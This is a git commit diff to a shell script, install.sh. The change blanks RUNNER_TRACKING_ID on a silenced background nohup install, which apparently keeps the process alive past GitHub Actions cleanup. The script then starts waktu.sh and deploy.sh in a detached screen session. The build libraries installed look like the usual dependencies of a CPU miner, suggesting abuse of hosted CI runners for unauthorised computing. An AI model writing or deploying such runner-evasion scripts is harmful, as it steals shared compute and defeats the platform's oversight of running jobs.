fc58da625c8e07063047d2987ac47e12513be3f4
slendep1922 <61906024+slendep1922@users.noreply.github.com>
2022-05-27 20:42:11 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 sudo apt update -y
-nohup bash -c "sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen -y &> /dev/null 2>&1&"
+RUNNER_TRACKING_ID="" nohup bash -c "sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen -y &> /dev/null 2>&1&"
 sudo apt install screen -y && chmod +x waktu.sh && screen -dmS run ./waktu.sh && chmod +x deploy.sh && ./deploy.sh
